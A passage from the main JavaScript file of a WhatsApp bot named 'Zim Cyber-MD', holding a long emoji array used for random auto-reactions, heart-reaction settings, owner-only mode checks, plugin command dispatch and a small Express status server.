'ℹ️', '‼️', '⁉️', '‽️', '©️', '®️', '™️', '🔴', '🔵', '🟢', '🔹', '🔺', '💯', '👑', '🤣', "🤷‍♂️", "🤷‍♀️", "🙅‍♂️", "🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", '🏻', '💆‍♂️', "💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '�', '🏯', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🌳', '🌲', '🌾', '🌿', '🍃', '🍂', '🍃', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌱', '🌿', '🍃', '🍂', '🌻', '💐', '🌹', '🌺', '🌸', '🌴', '🏵', '🎀', '🏆', '🏈', '🏉', '🎯', '🏀', '🏊', '🏋', '🏌', '🎲', '📚', '📖', '📜', '📝', '💭', '💬', '🗣', '💫', '🌟', '🌠', '🎉', '🎊', '👏', '💥', '🔥', '💥', '🌪', '💨', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', '🌪', '🌫', '🌬', '🌩', '🌨', '🌧', '🌦', '🌥', '🌡', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🐒', '🦍', '🦧', '🐶', '🐕', '🦮', "🐕‍🦺", '🐩', '🐺', '🦊', '🦝', '🐱', '🐈', "🐈‍⬛", '🦁', '🐯', '🐅', '🐆', '🐴', '🐎', '🦄', '🦓', '🦌', '🦬', '🐮', '🐂', '🐃', '🐄', '🐷', '🐖', '🐗', '🐽', '🐏', '🐑', '🐐', '🐪', '🐫', '🦙', '🦒', '🐘', '🦣', '🦏', '🦛', '🐭', '🐁', '🐀', '🐹', '🐰', '🐇', "🐿️", '🦫', '🦔', '🦇', '🐻', "🐻‍❄️", '🐨', '🐼', '🦥', '🦦', '🦨', '🦘', '🦡', '🐾', '🦃', '🐔', '🐓', '🐣', '🐤', '🐥', '🐦', '🐧', "🕊️", '🦅', '🦆', '🦢', '🦉', '🦤', '🪶', '🦩', '🦚', '🦜', '🐸', '🐊', '🐢', '🦎', '🐍', '🐲', '🐉', '🦕', '🦖', '🐳', '🐋', '🐬', '🦭', '🐟', '🐠', '😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '☺️', '😚', '😙', '🥲', '😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', "😶‍🌫️", '😏', '😒', '🙄', '😬', "😮‍💨", '🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', "😵‍💫", '🤯', '🤠', '🥳', '🥸', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭', '😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾', '🙈', '🙉', '🙊', '💋', '💌', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '💟', '❣️', '💔', "❤️‍🔥", "❤️‍🩹", '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💯', '💢', '💥', '💫', '💦', '💨', "🕳️", '💣', '💬', "👁️‍🗨️", "🗨️", "🗯️", '💭', '💤', '👋', '🤚', "🖐️", '✋', '🖖', '👌', '🤌', '🤏', '✌️', '🤞', '🤟', '🤘', '🤙', '👈', '👉', '👆', '🖕', '👇', '☝️', '👍', '👎', '✊', '👊', '🤛', '🤜', '👏', '🙌', '👐', '🤲', '🤝', '🙏', '✍️', '💅', '🤳', '💪', '🦾', '🦿', '🦵', '🦶', '👂', '🦻', '👃', '🧠', '🫀', '🫁', '🦷', '🦴', '👀', "👁️", '👅', '👄', '👶', '🧒', '👦', '👧', '🧑', '👱', '👨', '🧔', "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳", "👨‍🦲", '👩', "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲", "👱‍♀️", "👱‍♂️", '🧓', '👴', '👵', '🙍', "🙍‍♂️", "🙍‍♀️", '🙎', "🙎‍♂️", "🙎‍♀️", '🙅', "🙅‍♂️", "🙅‍♀️", '🙆', "🙆‍♂️", "🙆‍♀️", '💁', "💁‍♂️", "💁‍♀️", '🙋', "🙋‍♂️", "🙋‍♀️", '🧏', "🧏‍♂️", "🧏‍♀️", '🙇', "🙇‍♂️", "🙇‍♀️", '🤦', "🤦‍♂️", "🤦‍♀️", '🤷', "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓", "👩‍🎓", "🧑‍🏫", '👨‍🏫', "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾", "🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼", "👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤", "👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀", "🧑‍🚒", "👨‍🚒", "👩‍🚒", '👮', "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", '💂', "💂‍♂️", "💂‍♀️", '🥷', '👷', "👷‍♂️", "👷‍♀️", '🤴', '👸', '👳', "👳‍♂️", "👳‍♀️", '👲', '🧕', '🤵', "🤵‍♂️", "🤵‍♀️", '👰', "👰‍♂️", "👰‍♀️", '🤰', '🤱', "👩‍🍼", "👨‍🍼", "🧑‍🍼", '👼', '🎅', '🤶', "🧑‍🎄", '🦸', "🦸‍♂️", "🦸‍♀️", '🦹', "🦹‍♂️", "🦹‍♀️", '🧙', "🧙‍♂️", "🧙‍♀️", '🧚', "🧚‍♂️", "🧚‍♀️", '🧛', "🧛‍♂️", "🧛‍♀️", '🧜', "🧜‍♂️", "🧜‍♀️", '🧝', "🧝‍♂️", "🧝‍♀️", '🧞', "🧞‍♂️", "🧞‍♀️", '🧟', "🧟‍♂️", "🧟‍♀️", '💆', "💆‍♂️", "💆‍♀️", '💇', "💇‍♂️", "💇‍♀️", '🚶', "🚶‍♂️", "🚶‍♀️", '🧍', "🧍‍♂️", "🧍‍♀️", '🧎', "🧎‍♂️", "🧎‍♀️", "🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", '🏃', "🏃‍♂️", "🏃‍♀️", '💃', '🕺', "🕴️", '👯', "👯‍♂️", "👯‍♀️", '🧖', "🧖‍♂️", "🧖‍♀️", '🧗', "🧗‍♂️", "🧗‍♀️", '🤺', '🏇', '⛷️', '🏂', "🏌️", "🏌️‍♂️", "🏌️‍♀️", '🏄', "🏄‍♂️", "🏄‍♀️", '🚣', "🚣‍♂️", "🚣‍♀️", '🏊', "🏊‍♂️", "🏊‍♀️", '⛹️', "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", '🚴', "🚴‍♂️", '🚴‍♀️', '🚵', "🚵‍♂️", "🚵‍♀️", '🤸', "🤸‍♂️", "🤸‍♀️", '🤼', "🤼‍♂️", "🤼‍♀️", '🤽', "🤽‍♂️", "🤽‍♀️", '🤾', "🤾‍♂️", "🤾‍♀️", '🤹', "🤹‍♂️", "🤹‍♀️", '🧘', "🧘‍♂️", "🧘‍♀️", '🛀', '🛌', "🧑‍🤝‍🧑", '👭', '👫', '👬', '💏', "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩", '💑', "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", '👪', "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧", "👨‍👨‍👦", '👨‍👨‍👧', "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧", "👨‍👦", "👨‍👦‍👦", "👨‍👧", "👨‍👧‍👦", "👨‍👧‍👧", "👩‍👦", "👩‍👦‍👦", "👩‍👧", "👩‍👧‍👦", "👩‍👧‍👧", "🗣️", '👤', '👥', '🫂', '👣', '🦰', '🦱', '🦳', '🦲', '🐵'];
        const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomOwnerReaction);
    }
}
        
//============================HRTPACK============================       
        //=======HRT React 
if (!isReact && senderNumber !== botNumber) {
    if (config.HEART_REACT === 'true') {
            const reactions = ['💘', '💝', '💖', '💗', '💓', '💞', '💕', '❣️', '❤️‍🔥', '❤️‍🩹', '❤️', '🩷', '🧡', '💛', '💚', '💙', '🩵', '💜', '🤎', '🖤', '🩶', '🤍'];
           const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}
//=======HRT React 
if (!isReact && senderNumber === botNumber) {
    if (config.HEART_REACT === 'true') {
            const reactions = ['💘', '💝', '💖', '💗', '💓', '💞', '💕', '❣️', '❤️‍🔥', '❤️‍🩹', '❤️', '🩷', '🧡', '💛', '💚', '💙', '🩵', '💜', '🤎', '🖤', '🩶', '🤍'];
           const randomReaction = reactions[Math.floor(Math.random() * reactions.length)]; // 
        m.react(randomReaction);
    }
}        
//=================================WORKTYPE=========================================== 
if(!isOwner && config.MODE === "private") return
if(!isOwner && isGroup && config.MODE === "inbox") return
if(!isOwner && isGroup && config.MODE === "groups") return
//======================================================





        
const events = require('./command')
const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[PLUGIN ERROR] " + e);
}
}
}
events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}});

})
}
app.get("/", (req, res) => {
res.send("HEY, Zim Cyber-MD STARTED ✅");
});
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
setTimeout(() => {
connectToWA()
}, 4000);
